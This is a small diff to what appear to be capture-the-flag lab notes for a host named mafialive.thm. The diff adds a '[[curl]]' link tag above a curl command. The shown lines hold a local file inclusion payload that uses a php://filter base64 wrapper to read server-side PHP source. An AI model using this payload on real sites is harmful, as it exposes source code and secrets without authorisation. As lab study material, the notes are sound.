@@ -30,6 +30,7 @@ syntax
 http://***DOMAIN***.thm/***PAGE***?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/***PAGE***
 ```
 
+[[curl]]
 ```sh
 curl -s http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php
 ```
